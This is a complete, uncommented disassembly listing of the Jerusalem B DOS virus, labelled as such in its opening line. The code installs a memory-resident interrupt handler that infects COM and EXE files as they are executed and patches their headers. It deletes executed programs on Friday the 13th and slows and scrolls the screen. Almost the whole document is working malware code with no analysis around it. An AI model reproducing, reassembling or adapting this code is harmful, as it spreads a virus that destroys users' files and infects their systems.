This is the Jerusalem B Virus.
"JV.MOC"                                                              PAGE  0001

0000:0000  E99200                    JMP     X0095
0000:0003  7355                      JAE     X005A
0000:0005  4D                        DEC     BP
0000:0006  7344                      JAE     X004C
0000:0008  6F73                      JG      X007D
0000:000A  0001                      ADD     [BX+DI],AL
0000:000C  BD1700                    MOV     BP,0017H
0000:000F  0000                      ADD     [BX+SI],AL
0000:0011  06                        PUSH    ES
0000:0012  00A5FE00                  ADD     [DI+Y00FEH],AH
0000:0016  F016                      LOCK  PUSH    SS
0000:0018  17                        POP     SS
0000:0019  7702                      JA      X001D
0000:001B  BF053D                    MOV     DI,03D05H
0000:001E  0CFB                      OR      AL,0FBH
0000:0020  7D00                      JGE     X0022
0000:0022  0000              X0022:  ADD     [BX+SI],AL
0000:0024  0000                      ADD     [BX+SI],AL
0000:0026  0000                      ADD     [BX+SI],AL
0000:0028  0000                      ADD     [BX+SI],AL
0000:002A  0000                      ADD     [BX+SI],AL
0000:002C  0000                      ADD     [BX+SI],AL
0000:002E  E8062A                    CALL    X2A37
0000:0031  B10D                      MOV     CL,0DH
0000:0033  800000                    ADD     BYTE PTR [BX+SI],00H
0000:0036  008000B1                  ADD     [BX+SI+Y0B100H],AL
0000:003A  0D5C00                    OR      AX,005CH
0000:003D  B10D                      MOV     CL,0DH
0000:003F  6C00                      JL      X0041
0000:0041  B10D              X0041:  MOV     CL,0DH
0000:0043  0004                      ADD     [SI],AL
0000:0045  5F                        POP     DI
0000:0046  0F                        POP     CS
0000:0047  B400                      MOV     AH,00H
0000:0049  C1                        RET                       ; INTRASEGMENT
0000:004A  0D00F0            X004A:  OR      AX,0F000H
0000:004D  06                        PUSH    ES
0000:004E  004D5A                    ADD     [DI+05AH],CL
0000:0051  2000                      AND     [BX+SI],AL
0000:0053  1000                      ADC     [BX+SI],AL
0000:0055  1900                      SBB     [BX+SI],AX
0000:0057  0800                      OR      [BX+SI],AL
0000:0059  7500                      JNZ     X005B
0000:005B  7500              X005B:  JNZ     X005D
0000:005D  6901              X005D:  JNS     X0060
0000:005F  1007                      ADC     [BX],AL
0000:0061  8419                      TEST    BL,[BX+DI]
0000:0063  C500                      LDS     AX,[BX+SI]
0000:0065  6901                      JNS     X0068
0000:0067  1C00                      SBB     AL,00H
0000:0069  0000                      ADD     [BX+SI],AL
0000:006B  4C                X006B:  DEC     SP
0000:006C  B000                      MOV     AL,00H
0000:006E  CD21                      INT     021H
0000:0070  050020                    ADD     AX,02000H
0000:0073  0037                      ADD     [BX],DH

"JV.MOC"                                                              PAGE  0002

0000:0075  121C                      ADC     BL,[SI]
0000:0077  0100                      ADD     [BX+SI],AX
0000:0079  0210                      ADD     DL,[BX+SI]
0000:007B  0010                      ADD     [BX+SI],DL
0000:007D  17                X007D:  POP     SS
0000:007E  0000                      ADD     [BX+SI],AL
0000:0080  53                        PUSH    BX
0000:0081  61E8                      JNO     X006B
0000:0083  38434F                    CMP     [BP+DI+04FH],AL
0000:0086  4D                        DEC     BP
0000:0087  4D                        DEC     BP
0000:0088  41                        INC     CX
0000:0089  4E                        DEC     SI
0000:008A  44                        INC     SP
0000:008B  2E43                      INC     BX
0000:008D  4F                        DEC     DI
0000:008E  4D                        DEC     BP
0000:008F  0100                      ADD     [BX+SI],AX
0000:0091  0000                      ADD     [BX+SI],AL
0000:0093  0000                      ADD     [BX+SI],AL
0000:0095  FC                X0095:  CLD     
0000:0096  B4E0                      MOV     AH,0E0H
0000:0098  CD21                      INT     021H
0000:009A  80FCE0                    CMP     AH,0E0H
0000:009D  7316                      JAE     X00B5
0000:009F  80FC03                    CMP     AH,03H
0000:00A2  7211                      JB      X00B5
0000:00A4  B4DD                      MOV     AH,0DDH
0000:00A6  BF0001                    MOV     DI,0100H
0000:00A9  BE1007                    MOV     SI,0710H
0000:00AC  03F7                      ADD     SI,DI
0000:00AE  2E8B8D1100                MOV     CX,CS:[DI+Y0011H]
0000:00B3  CD21                      INT     021H
0000:00B5  8CC8              X00B5:  MOV     AX,CS
0000:00B7  051000                    ADD     AX,0010H
0000:00BA  8ED0                      MOV     SS,AX
0000:00BC  BC0007                    MOV     SP,0700H
0000:00BF  50                        PUSH    AX
0000:00C0  B8C500                    MOV     AX,00C5H
0000:00C3  50                        PUSH    AX
0000:00C4  CB                        RET                       ; INTERSEGMENT
0000:00C5  FC                X00C5:  CLD     
0000:00C6  06                        PUSH    ES
0000:00C7  2E8C063100                MOV     CS:[Y0031H],ES
0000:00CC  2E8C063900                MOV     CS:[Y0039H],ES
0000:00D1  2E8C063D00                MOV     CS:[Y003DH],ES
0000:00D6  2E8C064100                MOV     CS:[Y0041H],ES
0000:00DB  8CC0                      MOV     AX,ES
0000:00DD  051000                    ADD     AX,0010H
0000:00E0  2E01064900                ADD     CS:[Y0049H],AX
0000:00E5  2E01064500                ADD     CS:[Y0045H],AX
0000:00EA  B4E0                      MOV     AH,0E0H
0000:00EC  CD21                      INT     021H
0000:00EE  80FCE0                    CMP     AH,0E0H
0000:00F1  7313                      JAE     X0106
0000:00F3  80FC03                    CMP     AH,03H

"JV.MOC"                                                              PAGE  0003

0000:00F6  07                        POP     ES
0000:00F7  2E8E164500                MOV     SS,CS:[Y0045H]
0000:00FC  2E8B264300                MOV     SP,CS:[Y0043H]
0000:0101  2EFF2E4700                JMP     CS:[Y0047H]
0000:0106  33C0              X0106:  XOR     AX,AX
0000:0108  8EC0                      MOV     ES,AX
0000:010A  26A1FC03                  MOV     AX,ES:Y03FCH
0000:010E  2EA34B00                  MOV     CS:Y004BH,AX
0000:0112  26A0FE03                  MOV     AL,ES:Y03FEH
0000:0116  2EA24D00                  MOV     CS:Y004DH,AL
0000:011A  26C706FC03F3A5            MOV     WORD PTR ES:[Y03FCH],0A5F3H
0000:0121  26C606FE03CB              MOV     BYTE PTR ES:[Y03FEH],0CBH
0000:0127  58                        POP     AX
0000:0128  051000                    ADD     AX,0010H
0000:012B  8EC0                      MOV     ES,AX
0000:012D  0E                        PUSH    CS
0000:012E  1F                        POP     DS
0000:012F  B91007                    MOV     CX,0710H
0000:0132  D1E9                      SHR     CX,1
0000:0134  33F6                      XOR     SI,SI
0000:0136  8BFE                      MOV     DI,SI
0000:0138  06                        PUSH    ES
0000:0139  B84201                    MOV     AX,0142H
0000:013C  50                        PUSH    AX
0000:013D  EAFC030000                JMP     X0000_03FC
0000:0142  8CC8                      MOV     AX,CS
0000:0144  8ED0                      MOV     SS,AX
0000:0146  BC0007                    MOV     SP,0700H
0000:0149  33C0                      XOR     AX,AX
0000:014B  8ED8                      MOV     DS,AX
0000:014D  2EA14B00                  MOV     AX,CS:Y004BH
0000:0151  A3FC03                    MOV     Y03FCH,AX
0000:0154  2EA04D00                  MOV     AL,CS:Y004DH
0000:0158  A2FE03                    MOV     Y03FEH,AL
0000:015B  8BDC                      MOV     BX,SP
0000:015D  B104                      MOV     CL,04H
0000:015F  D3EB                      SHR     BX,CL
0000:0161  83C310                    ADD     BX,0010H
0000:0164  2E891E3300                MOV     CS:[Y0033H],BX
0000:0169  B44A                      MOV     AH,04AH
0000:016B  2E8E063100                MOV     ES,CS:[Y0031H]
0000:0170  CD21                      INT     021H
0000:0172  B82135                    MOV     AX,03521H
0000:0175  CD21                      INT     021H
0000:0177  2E891E1700                MOV     CS:[Y0017H],BX
0000:017C  2E8C061900                MOV     CS:[Y0019H],ES
0000:0181  0E                        PUSH    CS
0000:0182  1F                        POP     DS
0000:0183  BA5B02                    MOV     DX,025BH
0000:0186  B82125                    MOV     AX,02521H
0000:0189  CD21                      INT     021H
0000:018B  8E063100                  MOV     ES,[Y0031H]
0000:018F  268E062C00                MOV     ES,ES:[Y002CH]
0000:0194  33FF                      XOR     DI,DI
0000:0196  B9FF7F                    MOV     CX,07FFFH
0000:0199  32C0                      XOR     AL,AL

"JV.MOC"                                                              PAGE  0004

0000:019B  F2AE              X019B:  REPNE  SCASB   
0000:019D  263805                    CMP     ES:[DI],AL
0000:01A0  E0F9                      LOOPNZ  X019B
0000:01A2  8BD7                      MOV     DX,DI
0000:01A4  83C203                    ADD     DX,0003H
0000:01A7  B8004B                    MOV     AX,04B00H
0000:01AA  06                        PUSH    ES
0000:01AB  1F                        POP     DS
0000:01AC  0E                        PUSH    CS
0000:01AD  07                        POP     ES
0000:01AE  BB3500                    MOV     BX,0035H
0000:01B1  1E                        PUSH    DS
0000:01B2  06                        PUSH    ES
0000:01B3  50                        PUSH    AX
0000:01B4  53                        PUSH    BX
0000:01B5  51                        PUSH    CX
0000:01B6  52                        PUSH    DX
0000:01B7  B42A                      MOV     AH,02AH
0000:01B9  CD21                      INT     021H
0000:01BB  2EC6060E0000              MOV     BYTE PTR CS:[Y000EH],00H
0000:01C1  81F9C307                  CMP     CX,07C3H
0000:01C5  7430                      JZ      X01F7
0000:01C7  3C05                      CMP     AL,05H
0000:01C9  750D                      JNZ     X01D8
0000:01CB  80FA0D                    CMP     DL,0DH
0000:01CE  7508                      JNZ     X01D8
0000:01D0  2EFE060E00                INC     BYTE PTR CS:[Y000EH]
0000:01D5  EB20                      JMP     X01F7
0000:01D7  90                        NOP     
0000:01D8  B80835            X01D8:  MOV     AX,03508H
0000:01DB  CD21                      INT     021H
0000:01DD  2E891E1300                MOV     CS:[Y0013H],BX
0000:01E2  2E8C061500                MOV     CS:[Y0015H],ES
0000:01E7  0E                        PUSH    CS
0000:01E8  1F                        POP     DS
0000:01E9  C7061F00907E              MOV     WORD PTR [Y001FH],07E90H
0000:01EF  B80825                    MOV     AX,02508H
0000:01F2  BA1E02                    MOV     DX,021EH
0000:01F5  CD21                      INT     021H
0000:01F7  5A                X01F7:  POP     DX
0000:01F8  59                        POP     CX
0000:01F9  5B                        POP     BX
0000:01FA  58                        POP     AX
0000:01FB  07                        POP     ES
0000:01FC  1F                        POP     DS
0000:01FD  9C                        PUSHF   
0000:01FE  2EFF1E1700                CALL    CS:[Y0017H]
0000:0203  1E                        PUSH    DS
0000:0204  07                        POP     ES
0000:0205  B449                      MOV     AH,049H
0000:0207  CD21                      INT     021H
0000:0209  B44D                      MOV     AH,04DH
0000:020B  CD21                      INT     021H
0000:020D  B431                      MOV     AH,031H
0000:020F  BA0006                    MOV     DX,0600H
0000:0212  B104                      MOV     CL,04H

"JV.MOC"                                                              PAGE  0005

0000:0214  D3EA                      SHR     DX,CL
0000:0216  83C210                    ADD     DX,0010H
0000:0219  CD21                      INT     021H
0000:021B  32C0                      XOR     AL,AL
0000:021D  CF                        IRET    
0000:021E  2E833E1F0002              CMP     WORD PTR CS:[Y001FH],0002H
0000:0224  7517                      JNZ     X023D
0000:0226  50                        PUSH    AX
0000:0227  53                        PUSH    BX
0000:0228  51                        PUSH    CX
0000:0229  52                        PUSH    DX
0000:022A  55                        PUSH    BP
0000:022B  B80206                    MOV     AX,0602H
0000:022E  B787                      MOV     BH,087H
0000:0230  B90505                    MOV     CX,0505H
0000:0233  BA1010                    MOV     DX,01010H
0000:0236  CD10                      INT     010H
0000:0238  5D                        POP     BP
0000:0239  5A                        POP     DX
0000:023A  59                        POP     CX
0000:023B  5B                        POP     BX
0000:023C  58                        POP     AX
0000:023D  2EFF0E1F00        X023D:  DEC     WORD PTR CS:[Y001FH]
0000:0242  7512                      JNZ     X0256
0000:0244  2EC7061F000100            MOV     WORD PTR CS:[Y001FH],0001H
0000:024B  50                        PUSH    AX
0000:024C  51                        PUSH    CX
0000:024D  56                        PUSH    SI
0000:024E  B90140                    MOV     CX,04001H
0000:0251  F3AC                      REPE  LODSB   
0000:0253  5E                        POP     SI
0000:0254  59                        POP     CX
0000:0255  58                        POP     AX
0000:0256  2EFF2E1300        X0256:  JMP     CS:[Y0013H]
0000:025B  9C                X025B:  PUSHF   
0000:025C  80FCE0                    CMP     AH,0E0H
0000:025F  7505                      JNZ     X0266
0000:0261  B80003                    MOV     AX,0300H
0000:0264  9D                        POPF    
0000:0265  CF                        IRET    
0000:0266  80FCDD            X0266:  CMP     AH,0DDH
0000:0269  7413                      JZ      X027E
0000:026B  80FCDE                    CMP     AH,0DEH
0000:026E  7428                      JZ      X0298
0000:0270  3D004B                    CMP     AX,04B00H
0000:0273  7503                      JNZ     X0278
0000:0275  E9B400                    JMP     X032C
0000:0278  9D                X0278:  POPF    
0000:0279  2EFF2E1700                JMP     CS:[Y0017H]
0000:027E  58                X027E:  POP     AX
0000:027F  58                        POP     AX
0000:0280  B80001                    MOV     AX,0100H
0000:0283  2EA30A00                  MOV     CS:Y000AH,AX
0000:0287  58                        POP     AX
0000:0288  2EA30C00                  MOV     CS:Y000CH,AX
0000:028C  F3A4                      REPE  MOVSB   

"JV.MOC"                                                              PAGE  0006

0000:028E  9D                        POPF    
0000:028F  2EA10F00                  MOV     AX,CS:Y000FH
0000:0293  2EFF2E0A00                JMP     CS:[Y000AH]
0000:0298  83C406            X0298:  ADD     SP,0006H
0000:029B  9D                        POPF    
0000:029C  8CC8                      MOV     AX,CS
0000:029E  8ED0                      MOV     SS,AX
0000:02A0  BC1007                    MOV     SP,0710H
0000:02A3  06                        PUSH    ES
0000:02A4  06                        PUSH    ES
0000:02A5  33FF                      XOR     DI,DI
0000:02A7  0E                        PUSH    CS
0000:02A8  07                        POP     ES
0000:02A9  B91000                    MOV     CX,0010H
0000:02AC  8BF3                      MOV     SI,BX
0000:02AE  BF2100                    MOV     DI,0021H
0000:02B1  F3A4                      REPE  MOVSB   
0000:02B3  8CD8                      MOV     AX,DS
0000:02B5  8EC0                      MOV     ES,AX
0000:02B7  2EF7267A00                MUL     WORD PTR CS:[Y007AH]
0000:02BC  2E03062B00                ADD     AX,CS:[Y002BH]
0000:02C1  83D200                    ADC     DX,0000H
0000:02C4  2EF7367A00                DIV     WORD PTR CS:[Y007AH]
0000:02C9  8ED8                      MOV     DS,AX
0000:02CB  8BF2                      MOV     SI,DX
0000:02CD  8BFA                      MOV     DI,DX
0000:02CF  8CC5                      MOV     BP,ES
0000:02D1  2E8B1E2F00                MOV     BX,CS:[Y002FH]
0000:02D6  0BDB                      OR      BX,BX
0000:02D8  7413                      JZ      X02ED
0000:02DA  B90080            X02DA:  MOV     CX,08000H
0000:02DD  F3A5                      REPE  MOVSW   
0000:02DF  050010                    ADD     AX,01000H
0000:02E2  81C50010                  ADD     BP,01000H
0000:02E6  8ED8                      MOV     DS,AX
0000:02E8  8EC5                      MOV     ES,BP
0000:02EA  4B                        DEC     BX
0000:02EB  75ED                      JNZ     X02DA
0000:02ED  2E8B0E2D00        X02ED:  MOV     CX,CS:[Y002DH]
0000:02F2  F3A4                      REPE  MOVSB   
0000:02F4  58                        POP     AX
0000:02F5  50                        PUSH    AX
0000:02F6  051000                    ADD     AX,0010H
0000:02F9  2E01062900                ADD     CS:[Y0029H],AX
0000:02FE  2E01062500                ADD     CS:[Y0025H],AX
0000:0303  2EA12100                  MOV     AX,CS:Y0021H
0000:0307  1F                        POP     DS
0000:0308  07                        POP     ES
0000:0309  2E8E162900                MOV     SS,CS:[Y0029H]
0000:030E  2E8B262700                MOV     SP,CS:[Y0027H]
0000:0313  2EFF2E2300                JMP     CS:[Y0023H]
0000:0318  33C9              X0318:  XOR     CX,CX
0000:031A  B80143                    MOV     AX,04301H
0000:031D  CD21                      INT     021H
0000:031F  B441                      MOV     AH,041H
0000:0321  CD21                      INT     021H

"JV.MOC"                                                              PAGE  0007

0000:0323  B8004B                    MOV     AX,04B00H
0000:0326  9D                        POPF    
0000:0327  2EFF2E1700                JMP     CS:[Y0017H]
0000:032C  2E803E0E0001      X032C:  CMP     BYTE PTR CS:[Y000EH],01H
0000:0332  74E4                      JZ      X0318
0000:0334  2EC7067000FFFF            MOV     WORD PTR CS:[Y0070H],0FFFFH
0000:033B  2EC7068F000000            MOV     WORD PTR CS:[Y008FH],0000H
0000:0342  2E89168000                MOV     CS:[Y0080H],DX
0000:0347  2E8C1E8200                MOV     CS:[Y0082H],DS
0000:034C  50                        PUSH    AX
0000:034D  53                        PUSH    BX
0000:034E  51                        PUSH    CX
0000:034F  52                        PUSH    DX
0000:0350  56                        PUSH    SI
0000:0351  57                        PUSH    DI
0000:0352  1E                        PUSH    DS
0000:0353  06                        PUSH    ES
0000:0354  FC                        CLD     
0000:0355  8BFA                      MOV     DI,DX
0000:0357  32D2                      XOR     DL,DL
0000:0359  807D013A                  CMP     BYTE PTR [DI+01H],03AH
0000:035D  7505                      JNZ     X0364
0000:035F  8A15                      MOV     DL,[DI]
0000:0361  80E21F                    AND     DL,01FH
0000:0364  B436              X0364:  MOV     AH,036H
0000:0366  CD21                      INT     021H
0000:0368  3DFFFF                    CMP     AX,0FFFFH
0000:036B  7503                      JNZ     X0370
0000:036D  E97702            X036D:  JMP     X05E7
0000:0370  F7E3              X0370:  MUL     BX
0000:0372  F7E1                      MUL     CX
0000:0374  0BD2                      OR      DX,DX
0000:0376  7505                      JNZ     X037D
0000:0378  3D1007                    CMP     AX,0710H
0000:037B  72F0                      JB      X036D
0000:037D  2E8B168000        X037D:  MOV     DX,CS:[Y0080H]
0000:0382  1E                        PUSH    DS
0000:0383  07                        POP     ES
0000:0384  32C0                      XOR     AL,AL
0000:0386  B94100                    MOV     CX,0041H
0000:0389  F2AE                      REPNE  SCASB   
0000:038B  2E8B368000                MOV     SI,CS:[Y0080H]
0000:0390  8A04              X0390:  MOV     AL,[SI]
0000:0392  0AC0                      OR      AL,AL
0000:0394  740E                      JZ      X03A4
0000:0396  3C61                      CMP     AL,061H
0000:0398  7207                      JB      X03A1
0000:039A  3C7A                      CMP     AL,07AH
0000:039C  7703                      JA      X03A1
0000:039E  802C20                    SUB     BYTE PTR [SI],020H
0000:03A1  46                X03A1:  INC     SI
0000:03A2  EBEC                      JMP     X0390
0000:03A4  B90B00            X03A4:  MOV     CX,000BH
0000:03A7  2BF1                      SUB     SI,CX
0000:03A9  BF8400                    MOV     DI,0084H
0000:03AC  0E                        PUSH    CS

"JV.MOC"                                                              PAGE  0008

0000:03AD  07                        POP     ES
0000:03AE  B90B00                    MOV     CX,000BH
0000:03B1  F3A6                      REPE  CMPSB   
0000:03B3  7503                      JNZ     X03B8
0000:03B5  E92F02                    JMP     X05E7
0000:03B8  B80043            X03B8:  MOV     AX,04300H
0000:03BB  CD21                      INT     021H
0000:03BD  7205                      JB      X03C4
0000:03BF  2E890E7200                MOV     CS:[Y0072H],CX
0000:03C4  7225              X03C4:  JB      X03EB
0000:03C6  32C0                      XOR     AL,AL
0000:03C8  2EA24E00                  MOV     CS:Y004EH,AL
0000:03CC  1E                        PUSH    DS
0000:03CD  07                        POP     ES
0000:03CE  8BFA                      MOV     DI,DX
0000:03D0  B94100                    MOV     CX,0041H
0000:03D3  F2AE                      REPNE  SCASB   
0000:03D5  807DFE4D                  CMP     BYTE PTR [DI-02H],04DH
0000:03D9  740B                      JZ      X03E6
0000:03DB  807DFE6D                  CMP     BYTE PTR [DI-02H],06DH
0000:03DF  7405                      JZ      X03E6
0000:03E1  2EFE064E00                INC     BYTE PTR CS:[Y004EH]
0000:03E6  B8003D            X03E6:  MOV     AX,03D00H
0000:03E9  CD21                      INT     021H
0000:03EB  725A              X03EB:  JB      X0447
0000:03ED  2EA37000                  MOV     CS:Y0070H,AX
0000:03F1  8BD8                      MOV     BX,AX
0000:03F3  B80242                    MOV     AX,04202H
0000:03F6  B9FFFF                    MOV     CX,0FFFFH
0000:03F9  BAFBFF                    MOV     DX,0FFFBH
0000:03FC  CD21              X03FC:  INT     021H
0000:03FE  72EB                      JB      X03EB
0000:0400  050500                    ADD     AX,0005H
0000:0403  2EA31100                  MOV     CS:Y0011H,AX
0000:0407  B90500                    MOV     CX,0005H
0000:040A  BA6B00                    MOV     DX,006BH
0000:040D  8CC8                      MOV     AX,CS
0000:040F  8ED8                      MOV     DS,AX
0000:0411  8EC0                      MOV     ES,AX
0000:0413  B43F                      MOV     AH,03FH
0000:0415  CD21                      INT     021H
0000:0417  8BFA                      MOV     DI,DX
0000:0419  BE0500                    MOV     SI,0005H
0000:041C  F3A6                      REPE  CMPSB   
0000:041E  7507                      JNZ     X0427
0000:0420  B43E                      MOV     AH,03EH
0000:0422  CD21                      INT     021H
0000:0424  E9C001                    JMP     X05E7
0000:0427  B82435            X0427:  MOV     AX,03524H
0000:042A  CD21                      INT     021H
0000:042C  891E1B00                  MOV     [Y001BH],BX
0000:0430  8C061D00                  MOV     [Y001DH],ES
0000:0434  BA1B02                    MOV     DX,021BH
0000:0437  B82425                    MOV     AX,02524H
0000:043A  CD21                      INT     021H
0000:043C  C5168000                  LDS     DX,[Y0080H]

"JV.MOC"                                                              PAGE  0009

0000:0440  33C9                      XOR     CX,CX
0000:0442  B80143                    MOV     AX,04301H
0000:0445  CD21                      INT     021H
0000:0447  723B              X0447:  JB      X0484
0000:0449  2E8B1E7000                MOV     BX,CS:[Y0070H]
0000:044E  B43E                      MOV     AH,03EH
0000:0450  CD21                      INT     021H
0000:0452  2EC7067000FFFF            MOV     WORD PTR CS:[Y0070H],0FFFFH
0000:0459  B8023D                    MOV     AX,03D02H
0000:045C  CD21                      INT     021H
0000:045E  7224                      JB      X0484
0000:0460  2EA37000                  MOV     CS:Y0070H,AX
0000:0464  8CC8                      MOV     AX,CS
0000:0466  8ED8                      MOV     DS,AX
0000:0468  8EC0                      MOV     ES,AX
0000:046A  8B1E7000                  MOV     BX,[Y0070H]
0000:046E  B80057                    MOV     AX,05700H
0000:0471  CD21                      INT     021H
0000:0473  89167400                  MOV     [Y0074H],DX
0000:0477  890E7600                  MOV     [Y0076H],CX
0000:047B  B80042                    MOV     AX,04200H
0000:047E  33C9                      XOR     CX,CX
0000:0480  8BD1                      MOV     DX,CX
0000:0482  CD21                      INT     021H
0000:0484  723D              X0484:  JB      X04C3
0000:0486  803E4E0000                CMP     BYTE PTR [Y004EH],00H
0000:048B  7403                      JZ      X0490
0000:048D  EB57                      JMP     X04E6
0000:048F  90                        NOP     
0000:0490  BB0010            X0490:  MOV     BX,01000H
0000:0493  B448                      MOV     AH,048H
0000:0495  CD21                      INT     021H
0000:0497  730B                      JAE     X04A4
0000:0499  B43E                      MOV     AH,03EH
0000:049B  8B1E7000                  MOV     BX,[Y0070H]
0000:049F  CD21                      INT     021H
0000:04A1  E94301                    JMP     X05E7
0000:04A4  FF068F00          X04A4:  INC     WORD PTR [Y008FH]
0000:04A8  8EC0                      MOV     ES,AX
0000:04AA  33F6                      XOR     SI,SI
0000:04AC  8BFE                      MOV     DI,SI
0000:04AE  B91007                    MOV     CX,0710H
0000:04B1  F3A4                      REPE  MOVSB   
0000:04B3  8BD7                      MOV     DX,DI
0000:04B5  8B0E1100                  MOV     CX,[Y0011H]
0000:04B9  8B1E7000                  MOV     BX,[Y0070H]
0000:04BD  06                        PUSH    ES
0000:04BE  1F                        POP     DS
0000:04BF  B43F                      MOV     AH,03FH
0000:04C1  CD21                      INT     021H
0000:04C3  721C              X04C3:  JB      X04E1
0000:04C5  03F9                      ADD     DI,CX
0000:04C7  33C9                      XOR     CX,CX
0000:04C9  8BD1                      MOV     DX,CX
0000:04CB  B80042                    MOV     AX,04200H
0000:04CE  CD21                      INT     021H

"JV.MOC"                                                              PAGE  0010

0000:04D0  BE0500                    MOV     SI,0005H
0000:04D3  B90500                    MOV     CX,0005H
0000:04D6  F32EA4                    REPE  MOVS    ES:BYTE PTR (DI),CS:BYTE PT
                                                   R (SI)
0000:04D9  8BCF                      MOV     CX,DI
0000:04DB  33D2                      XOR     DX,DX
0000:04DD  B440                      MOV     AH,040H
0000:04DF  CD21                      INT     021H
0000:04E1  720D              X04E1:  JB      X04F0
0000:04E3  E9BC00                    JMP     X05A2
0000:04E6  B91C00            X04E6:  MOV     CX,001CH
0000:04E9  BA4F00                    MOV     DX,004FH
0000:04EC  B43F                      MOV     AH,03FH
0000:04EE  CD21                      INT     021H
0000:04F0  724A              X04F0:  JB      X053C
0000:04F2  C70661008419              MOV     WORD PTR [Y0061H],01984H
0000:04F8  A15D00                    MOV     AX,Y005DH
0000:04FB  A34500                    MOV     Y0045H,AX
0000:04FE  A15F00                    MOV     AX,Y005FH
0000:0501  A34300                    MOV     Y0043H,AX
0000:0504  A16300                    MOV     AX,Y0063H
0000:0507  A34700                    MOV     Y0047H,AX
0000:050A  A16500                    MOV     AX,Y0065H
0000:050D  A34900                    MOV     Y0049H,AX
0000:0510  A15300                    MOV     AX,Y0053H
0000:0513  833E510000                CMP     WORD PTR [Y0051H],0000H
0000:0518  7401                      JZ      X051B
0000:051A  48                        DEC     AX
0000:051B  F7267800          X051B:  MUL     WORD PTR [Y0078H]
0000:051F  03065100                  ADD     AX,[Y0051H]
0000:0523  83D200                    ADC     DX,0000H
0000:0526  050F00                    ADD     AX,000FH
0000:0529  83D200                    ADC     DX,0000H
0000:052C  25F0FF                    AND     AX,0FFF0H
0000:052F  A37C00                    MOV     Y007CH,AX
0000:0532  89167E00                  MOV     [Y007EH],DX
0000:0536  051007                    ADD     AX,0710H
0000:0539  83D200                    ADC     DX,0000H
0000:053C  723A              X053C:  JB      X0578
0000:053E  F7367800                  DIV     WORD PTR [Y0078H]
0000:0542  0BD2                      OR      DX,DX
0000:0544  7401                      JZ      X0547
0000:0546  40                        INC     AX
0000:0547  A35300            X0547:  MOV     Y0053H,AX
0000:054A  89165100                  MOV     [Y0051H],DX
0000:054E  A17C00                    MOV     AX,Y007CH
0000:0551  8B167E00                  MOV     DX,[Y007EH]
0000:0555  F7367A00                  DIV     WORD PTR [Y007AH]
0000:0559  2B065700                  SUB     AX,[Y0057H]
0000:055D  A36500                    MOV     Y0065H,AX
0000:0560  C7066300C500              MOV     WORD PTR [Y0063H],00C5H
0000:0566  A35D00                    MOV     Y005DH,AX
0000:0569  C7065F001007              MOV     WORD PTR [Y005FH],0710H
0000:056F  33C9                      XOR     CX,CX
0000:0571  8BD1                      MOV     DX,CX
0000:0573  B80042                    MOV     AX,04200H
0000:0576  CD21                      INT     021H

"JV.MOC"                                                              PAGE  0011

0000:0578  720A              X0578:  JB      X0584
0000:057A  B91C00                    MOV     CX,001CH
0000:057D  BA4F00                    MOV     DX,004FH
0000:0580  B440                      MOV     AH,040H
0000:0582  CD21                      INT     021H
0000:0584  7211              X0584:  JB      X0597
0000:0586  3BC1                      CMP     AX,CX
0000:0588  7518                      JNZ     X05A2
0000:058A  8B167C00                  MOV     DX,[Y007CH]
0000:058E  8B0E7E00                  MOV     CX,[Y007EH]
0000:0592  B80042                    MOV     AX,04200H
0000:0595  CD21                      INT     021H
0000:0597  7209              X0597:  JB      X05A2
0000:0599  33D2                      XOR     DX,DX
0000:059B  B91007                    MOV     CX,0710H
0000:059E  B440                      MOV     AH,040H
0000:05A0  CD21                      INT     021H
0000:05A2  2E833E8F0000      X05A2:  CMP     WORD PTR CS:[Y008FH],0000H
0000:05A8  7404                      JZ      X05AE
0000:05AA  B449                      MOV     AH,049H
0000:05AC  CD21                      INT     021H
0000:05AE  2E833E7000FF      X05AE:  CMP     WORD PTR CS:[Y0070H],0FFFFH
0000:05B4  7431                      JZ      X05E7
0000:05B6  2E8B1E7000                MOV     BX,CS:[Y0070H]
0000:05BB  2E8B167400                MOV     DX,CS:[Y0074H]
0000:05C0  2E8B0E7600                MOV     CX,CS:[Y0076H]
0000:05C5  B80157                    MOV     AX,05701H
0000:05C8  CD21                      INT     021H
0000:05CA  B43E                      MOV     AH,03EH
0000:05CC  CD21                      INT     021H
0000:05CE  2EC5168000                LDS     DX,CS:[Y0080H]
0000:05D3  2E8B0E7200                MOV     CX,CS:[Y0072H]
0000:05D8  B80143                    MOV     AX,04301H
0000:05DB  CD21                      INT     021H
0000:05DD  2EC5161B00                LDS     DX,CS:[Y001BH]
0000:05E2  B82425                    MOV     AX,02524H
0000:05E5  CD21                      INT     021H
0000:05E7  07                X05E7:  POP     ES
0000:05E8  1F                        POP     DS
0000:05E9  5F                        POP     DI
0000:05EA  5E                        POP     SI
0000:05EB  5A                        POP     DX
0000:05EC  59                        POP     CX
0000:05ED  5B                        POP     BX
0000:05EE  58                        POP     AX
0000:05EF  9D                        POPF    
0000:05F0  2EFF2E1700                JMP     CS:[Y0017H]
0000:05F5  0000              X05F5:  ADD     [BX+SI],AL
0000:05F7  0000                      ADD     [BX+SI],AL
0000:05F9  0000                      ADD     [BX+SI],AL
0000:05FB  0000                      ADD     [BX+SI],AL
0000:05FD  0000                      ADD     [BX+SI],AL
0000:05FF  004D00                    ADD     [DI+00H],CL
0000:0602  000F                      ADD     [BX],CL
0000:0604  0000                      ADD     [BX+SI],AL
0000:0606  0000                      ADD     [BX+SI],AL

"JV.MOC"                                                              PAGE  0012

0000:0608  0000                      ADD     [BX+SI],AL
0000:060A  0000                      ADD     [BX+SI],AL
0000:060C  0000                      ADD     [BX+SI],AL
0000:060E  0000                      ADD     [BX+SI],AL
0000:0610  CD20                      INT     020H
0000:0612  00A0009A                  ADD     [BX+SI+Y09A00H],AH
0000:0616  F0FE1D                    LOCK  CALL    [DI]        ; NOT VALID
0000:0619  F02F                      LOCK  DAS     
0000:061B  018E1E3C                  ADD     [BP+Y03C1EH],CX
0000:061F  018E1EEB                  ADD     [BP+Y0EB1EH],CX
0000:0623  048E                      ADD     AL,08EH
0000:0625  1E                        PUSH    DS
0000:0626  8E1EFFFF                  MOV     DS,[Y0FFFFH]
0000:062A  FFFF                      ???     DI
0000:062C  FFFF                      ???     DI
0000:062E  FFFF                      ???     DI
0000:0630  FFFF                      ???     DI
0000:0632  FFFF                      ???     DI
0000:0634  FFFF                      ???     DI
0000:0636  FFFF                      ???     DI
0000:0638  FFFF                      ???     DI
0000:063A  FFFF                      ???     DI
0000:063C  7C1F                      JL      X065D
0000:063E  DE3E8D29                  ESC     037H,[Y0298DH]
0000:0642  1400                      ADC     AL,00H
